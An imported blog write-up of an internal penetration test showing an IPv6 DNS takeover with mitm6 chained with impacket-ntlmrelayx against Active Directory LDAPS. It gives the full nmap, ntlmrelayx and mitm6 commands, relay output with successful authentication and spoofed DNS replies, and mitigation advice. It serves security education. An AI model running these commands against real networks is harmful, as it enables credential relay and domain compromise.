---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-05-08_ipv6-dns-takeover-via-mitm6-write-up.md
original_filename: 2023-05-08_ipv6-dns-takeover-via-mitm6-write-up.md
title: IPv6 DNS Takeover via mitm6 (Write Up)
category: documents
detected_topics:
- ssrf
- command-injection
- automation-abuse
- api-security
- mobile-security
tags:
- imported
- documents
- ssrf
- command-injection
- automation-abuse
- api-security
- mobile-security
language: en
raw_sha256: 862576a31ed1800cbe84b495a17bc5f0d5cf7881e87a20b34099033921c43859
text_sha256: e2878ccd6fe33a063a3927b5e33c7b5c76557f46c1aead57a5394a6203b3f38f
ingested_at: '2026-06-28T07:32:20Z'
sensitivity: unknown
redactions_applied: false
---

# IPv6 DNS Takeover via mitm6 (Write Up)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-05-08_ipv6-dns-takeover-via-mitm6-write-up.md
- Source Type: markdown
- Detected Topics: ssrf, command-injection, automation-abuse, api-security, mobile-security
- Ingested At: 2026-06-28T07:32:20Z
- Redactions Applied: False
- Raw SHA256: `862576a31ed1800cbe84b495a17bc5f0d5cf7881e87a20b34099033921c43859`
- Text SHA256: `e2878ccd6fe33a063a3927b5e33c7b5c76557f46c1aead57a5394a6203b3f38f`


## Content

---
title: "IPv6 DNS Takeover via mitm6 (Write Up)"
page_title: "Evan Ricafort | Blog: IPv6 DNS Takeover via mitm6 (Write Up)"
url: "http://blog.evanricafort.com/2023/05/ipv6-dns-takeover-via-mitm6-write-up.html"
final_url: "https://blog.evanricafort.com/2023/05/ipv6-dns-takeover-via-mitm6-write-up.html"
authors: ["Evan Ricafort (@evanricafort)"]
bugs: ["MiTM", "IPv6", "DNS takeover", "Misconfigured LDAP server", "Internal pentest"]
publication_date: "2023-05-08"
added_date: "2023-05-08"
source: "pentester.land/writeups.json"
original_index: 1178
---

Howdy Readers!

  

If you're into network pentesting, I'm sure you're familiar with this type of vulnerability. This vulnerability is all about IPv6 and DNS. 

  

IPv6 is the latest version of the Internet Protocol, which is used to identify and communicate with devices on the internet. DNS or the Domain Name System is a service that translates human-readable domain names (like "google.com") into IP addresses (like "2xx.xx.xxx.xx2") that devices can use to connect to websites and other internet services.

  

So IPv6 DNS takeover via mitm6 is a technique used to intercept and redirect DNS requests made by IPv6-enabled devices on a network. "mitm6" stands for "man-in-the-middle-6", and refers to the fact that this attack involves intercepting and manipulating network traffic in order to carry out the DNS takeover.

  

An IPv6 DNS takeover through mitm6 assault begins with an attacker intercepting and manipulating network traffic with the mitm6 tool. Specifically, the attacker broadcasts bogus router advertising to IPv6-enabled devices on the network, tricking them into routing their traffic through the attacker's workstation.

  

Once the attacker has control of the DNS requests, they can utilize them to carry out a variety of attacks. For instance, they might divert traffic intended for a legitimate website to a phony version of the same site that is intended to steal sensitive data like login credentials. 

  

So below is the step by step procedure on how to execute the attack. _(PS: This guide is from one of my internal network penetration test report so I redacted some sensitive information of the target.)_

_  
_

**\--Tools--**

  * NMAP
  * NTLMRelayx from Impacket
  * mitm6

  

**\--Steps to Reproduce--**

  

1\. Let's determine the domain name of the target using NMAP _(nmap -n -sV --script "ldap* and not brute" 1x.xx.xx.x1)._

**_Sample Request:_**

> _Nmap scan report for 1x.xx.xx.x1_
> 
>  _Host is up (0.0020s latency)._
> 
> _Not shown: 986 filtered tcp ports (no-response)_
> 
> _PORT STATE SERVICE VERSION_
> 
>  _53/tcp open domain Simple DNS Plus_
> 
>  _88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-05-01 10:20:01Z)_
> 
> _113/tcp closed ident_
> 
>  _135/tcp open msrpc?_
> 
> _139/tcp open netbios-ssn Microsoft Windows netbios-ssn_
> 
>  _**389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: test.redacted.site, Site: Default-First-Site-Name)**_
> 
> _| ldap-rootdse:_
> 
> _| LDAP Results_
> 
>  _| <ROOT>_
> 
> _| domainFunctionality: 7_
> 
>  _| forestFunctionality: 7_
> 
>  _| domainControllerFunctionality: 7_
> 
>  _|**rootDomainNamingContext: DC=test,DC=redacted,DC=site**_
> 
>  _| ldapServiceName: test.redacted.site:[[email protected]](/cdn-cgi/l/email-protection)_
> 
> _| isGlobalCatalogReady: TRUE_
> 
>  _| supportedSASLMechanisms: XXXX_
> 
>  _| supportedSASLMechanisms: XXX-XXXXXX_
> 
>  _| supportedSASLMechanisms: EXTERNAL_
> 
>  _| supportedSASLMechanisms: DIGEST-MD5_
> 
>  _| supportedLDAPVersion: 3_
> 
>  _| supportedLDAPVersion: 2_
> 
>  _| supportedLDAPPolicies: MaxPoolThreads_
> 
>  _| supportedLDAPPolicies: MaxPercentDirSyncRequests_
> 
>  _| supportedLDAPPolicies: MaxDatagramRecv_
> 
>  _| supportedLDAPPolicies: MaxReceiveBuffer_
> 
>  _| supportedLDAPPolicies: InitRecvTimeout_
> 
>  _| supportedLDAPPolicies: MaxConnections_
> 
>  _| supportedLDAPPolicies: MaxConnIdleTime_
> 
>  _| supportedLDAPPolicies: MaxPageSize_
> 
>  _  
> _
> 
> _< \--snip-->_

So as you can see port 389 (LDAP) is open which means that our target is vulnerable to the attack. IPv6 DNS takeover is not tied to a specific port number.

  

As a result, even though the attack does not specifically target any one port, it is crucial to understand that it can still be executed on any port that an IPv6-enabled network uses for DNS requests and responses.

  

2\. Run NTLMRelay using the following command (_impacket-ntlmrelayx -6 -t ldaps://1x.xx.xx.xx -wh fakewpad.test.redacted.site -l**lootme**_)

  

**_Sample Request:_**

> _impacket-ntlmrelayx -6 -t ldaps://1x.xx.xx.x1 -wh fakewpad.test.redacted.site -l lootme_
> 
>  _Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation_
> 
>  _  
> _
> 
> _[*] Protocol Client SMTP loaded.._
> 
> _[*] Protocol Client RPC loaded.._
> 
> _[*] Protocol Client SMB loaded.._
> 
> _[*] Protocol Client DCSYNC loaded.._
> 
> _[*] Protocol Client HTTP loaded.._
> 
> _[*] Protocol Client HTTPS loaded.._
> 
> _[*] Protocol Client IMAP loaded.._
> 
> _[*] Protocol Client IMAPS loaded.._
> 
> _[*] Protocol Client LDAPS loaded.._
> 
> _[*] Protocol Client LDAP loaded.._
> 
> _[*] Protocol Client MSSQL loaded.._
> 
> _[*] Running in relay mode to single host_
> 
>  _[*] Setting up SMB Server_
> 
>  _[*] Setting up HTTP Server on port 80_
> 
>  _[*] Setting up WCF Server_
> 
>  _[*] Setting up RAW Server on port 6666_
> 
>  _  
> _
> 
> _[*] Servers started, waiting for connections_
> 
>  _[*] HTTPD(80): Client requested path: /wpad.dat_
> 
>  _[*] HTTPD(80): Client requested path: /wpad.dat_
> 
>  _[*] HTTPD(80): Serving PAC file to client ::ffff:1xx.xx.xx.1xx_
> 
>  _[*] SMBD-Thread-6 (process_request_thread): Received connection from ::ffff:1xx.xx.xx.xx, attacking target ldaps://1x.xx.xx.x1_
> 
>  _[*] HTTPD(80): Client requested path: /wpad.dat_
> 
>  _[*] HTTPD(80): Client requested path: /wpad.dat_
> 
>  _[*] HTTPD(80): Client requested path: /wpad.dat_
> 
>  _[*] HTTPD(80): Serving PAC file to client ::ffff:1xx.xx.x.xx_
> 
>  _[*] HTTPD(80): Connection from ::ffff:1xx.xx.xx.xx controlled, attacking target ldaps://_
> 
> _1x.xx.xx.x1_
> 
>  _[*] HTTPD(80): Connection from ::ffff:__1xx.xx.xx.xx_ _controlled, attacking target ldaps://_
> 
> _1x.xx.xx.x1_
> 
>  _[*] HTTPD(80): Connection from ::ffff:__1xx.xx.xx.xx_ _controlled, attacking target ldaps://_
> 
> _1x.xx.xx.x1_
> 
>  _[*] HTTPD(80): Connection from ::ffff:__1xx.xx.xx.xx_ _controlled, attacking target ldaps://_
> 
> _1x.xx.xx.x1_
> 
>  _[*] HTTPD(80): Connection from ::ffff:__1xx.xx.xx.xx_ _controlled, attacking target ldaps://_
> 
> _1x.xx.xx.x1_
> 
>  _[*] HTTPD(80): Connection from ::ffff:__1xx.xx.xx.xx_ _controlled, attacking target ldaps://_
> 
> _1x.xx.xx.x1_
> 
>  _[*] HTTPD(80): Connection from ::ffff:__1xx.xx.xx.xx_ _controlled, attacking target ldaps://_
> 
> _1x.xx.xx.x1_
> 
>  _[*] HTTPD(80): Connection from ::ffff:__1xx.xx.xx.xx_ _controlled, attacking target ldaps://_
> 
> _1x.xx.xx.x1_
> 
>  _[*] HTTPD(80): Connection from ::ffff:__1xx.xx.xx.xx_ _controlled, attacking target ldaps://_
> 
> _1x.xx.xx.x1_
> 
>  _[*] HTTPD(80): Connection from ::ffff:__1xx.xx.xx.xx_ _controlled, attacking target ldaps://_
> 
> _1x.xx.xx.x1_
> 
>  _[*] HTTPD(80): Connection from ::ffff:__1xx.xx.xx.xx_ _controlled, attacking target ldaps://_
> 
> _1x.xx.xx.x1_
> 
>  _[*] HTTPD(80): Connection from ::ffff:__1xx.xx.xx.xx_ _controlled, attacking target ldaps://_
> 
> _1x.xx.xx.x1_
> 
> ** _[*] HTTPD(80): Authenticating against ldaps://__1x.xx.xx.x1_ _as TESTCLIENT/TESTUSER1 SUCCEED_**
> 
>  _**[*] Enumerating relayed user's privileges. This may take a while on large domains**_
> 
> ** _[*] HTTPD(80): Authenticating against ldaps://__1x.xx.xx.x1_ _as_**** _TESTCLIENT/TESTUSER1_**** _SUCCEED_**
> 
>  _**[*] Enumerating relayed user's privileges. This may take a while on large domains**_
> 
> ** _[*] HTTPD(80): Authenticating against ldaps://__1x.xx.xx.x1_ _as_**** _TESTCLIENT/TESTUSER1_**** _SUCCEED_**
> 
>  _**[*] Enumerating relayed user's privileges. This may take a while on large domains**_
> 
> ** _[*] HTTPD(80): Authenticating against ldaps://__1x.xx.xx.x1_ _as_**** _TESTCLIENT/TESTUSER1_**** _SUCCEED_**
> 
>  _**[*] Enumerating relayed user's privileges. This may take a while on large domains**_
> 
> ** _[*] HTTPD(80): Authenticating against ldaps://__1x.xx.xx.x1_ _as_**** _TESTCLIENT/TESTUSER1_**** _SUCCEED_**
> 
>  _**[*] Enumerating relayed user's privileges. This may take a while on large domains**_
> 
> ** _[*] HTTPD(80): Authenticating against ldaps://__1x.xx.xx.x1_ _as_**** _TESTCLIENT/TESTUSER1_**** _SUCCEED_**
> 
>  _  
> _
> 
> _< \--snip-->_

As you can we already received SUCCEED response from the NTLMRelay

  

3\. Open another terminal and run mitm6 using the following command (mitm6 -d test.redacted.site)

  

**_Sample Request:_**

> _mitm6 -d test.redacted.site_
> 
>  _:0: UserWarning: You do not have a working installation of the service_identity module: 'No module named 'service_identity''. Please install it from <https://pypi.python.org/pypi/service_identity> and make sure all of its dependencies are satisfied. Without the service_identity module, Twisted can perform only rudimentary TLS client hostname verification. Many valid certificate/hostname mappings may be rejected._
> 
> _Starting mitm6 using the following configuration:_
> 
> _Primary adapter: eth0 [00:xx:xx:xx:xx:xx]_
> 
> _IPv4 address: 1xx.xx.xx.xx_
> 
>  _IPv6 address: fxxx::2xx:xxxx:xxxx:xxxx_
> 
>  _DNS local search domain: test.redacted.site_
> 
>  _DNS allowlist: test.redaceted.site_
> 
>  _**IPv6 address fxxx::2xxx:x is now assigned to mac=xx:xx:xx:xx:xx:xx host=TESTHOST. ipv4=**_
> 
> _**Sent spoofed reply for mgmt.test.redacted.site. to fxxx::xxx:xx**_
> 
>  _  
> _
> 
> _< \--snip-->_

4\. After the successful attack, Open another terminal and then ls to the lootme folder. 

5\. Check the files from the **lootme** folder.

  

[![lootme folder](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjwgWl09wdjjpXYFw1ndVUpYQddaTlZwAN86mrE3O1E3QQzKFSh_Ac4X5i4Xd58FYXT7vxRRxjxzuAC5OtInboubacPnlj3CLlCj9XIQnrKIUkZZikOkIsuIdd5Ybf02k2LhNmWTNnidBiCngNGJdAhog6i6ZL_7RPQjxsBRbqQj8LrFFfdOloIlg/w640-h164/Screenshot%202023-05-08%20at%201.43.34%20PM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjwgWl09wdjjpXYFw1ndVUpYQddaTlZwAN86mrE3O1E3QQzKFSh_Ac4X5i4Xd58FYXT7vxRRxjxzuAC5OtInboubacPnlj3CLlCj9XIQnrKIUkZZikOkIsuIdd5Ybf02k2LhNmWTNnidBiCngNGJdAhog6i6ZL_7RPQjxsBRbqQj8LrFFfdOloIlg/s2880/Screenshot%202023-05-08%20at%201.43.34%20PM.png)  
---  
  
  
  
6\. Verify the vulnerability.

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEitFjB9Mc6MXnaf-abl-5NQ7xBOjctWInzY9Hu7Smq9dCgs_MiUu5zkRs-05l4cDv8q06tH77ZDXTqOSEXvaMn7QzHoK_hcm_QCPRXvD8sL0THJLFl0TKTCmwNu7NT-Fnm6_rcNdAG29omKSO31iTiyBHRJOQSsm2BsXXItHu_649YJIjaWuJtN4A/w640-h400/Screenshot%202023-05-08%20at%203.57.25%20PM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEitFjB9Mc6MXnaf-abl-5NQ7xBOjctWInzY9Hu7Smq9dCgs_MiUu5zkRs-05l4cDv8q06tH77ZDXTqOSEXvaMn7QzHoK_hcm_QCPRXvD8sL0THJLFl0TKTCmwNu7NT-Fnm6_rcNdAG29omKSO31iTiyBHRJOQSsm2BsXXItHu_649YJIjaWuJtN4A/s2880/Screenshot%202023-05-08%20at%203.57.25%20PM.png)

  

  

**\--Recommendations--**

  * The safest way to prevent man-in-the-middle attacks using mitm6 is to block DHCPv6 traffic and incoming RA (router advertisements) in Windows Firewall Group Policy since disabling IPv6 completely may result in unwanted side effects on the network.
  * If WPAD is not in use internally, disable it via Group Policy and by disabling the WinHttpAutoProxySvc service.
  * LDAP and LDAPS relay mitigation is by enabling both LDAP signing and LDAP channel binding.
  * Consider Administrative Users to the Protected Users group or marking them as Account is sensitive and cannot be delegated will prevent any impersonation of that user via delegation.

**\--References--**

  * https://docs.microsoft.com/en-us/archive/blogs/netro/arguments-against-disabling-ipv6
  * https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course

  

The vulnerability was rated as **Critical** in our pentest reports.

  

I hope you find this article interesting and useful.

  

> > _"Always remember that you are absolutely unique. Just like everyone else."_
>> 
>> _**–Margaret Mead**_
